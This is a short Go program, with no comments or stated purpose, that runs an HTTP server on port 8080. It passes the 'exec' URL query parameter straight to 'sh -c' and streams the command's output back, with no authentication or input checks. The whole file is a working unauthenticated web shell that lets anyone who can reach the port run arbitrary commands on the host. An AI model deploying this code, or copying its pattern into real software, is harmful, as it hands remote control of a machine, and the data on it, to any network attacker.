package main

import (
	"fmt"
	"io"
	"net/http"
	"os/exec"
)

type flushWriter struct {
	f http.Flusher
	w io.Writer
}

func (fw *flushWriter) Write(p []byte) (n int, err error) {
	n, err = fw.w.Write(p)
	if fw.f != nil {
		fw.f.Flush()
	}
	return
}

func main() {
	http.Handle("/", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fw := &flushWriter{w: w}
		if f, ok := w.(http.Flusher); ok {
			fw.f = f
		}

		qs := r.URL.Query()
		cmdString := qs.Get("exec")
		if cmdString == "" {
			cmdString = "uname -a"
		}

		cmd := exec.Command("sh", "-c", cmdString)

		cmd.Stdout = fw
		cmd.Stderr = fw

		stdin, err := cmd.StdinPipe()
		if err != nil {
			panic(err)
		}

		if err := stdin.Close(); err != nil {
			panic(err)
		}

		w.Header().Set("Content-Type", "text/plain")

		if err := cmd.Start(); err != nil {
			panic(err)
		}

		err = cmd.Wait()
		if perr, ok := err.(*exec.ExitError); ok {
			io.WriteString(w, fmt.Sprintf("Command exited with %d\n", perr.ExitCode()))
		} else if err != nil {
			panic(err)
		}
	}))

	panic(http.ListenAndServe(":8080", nil))
}
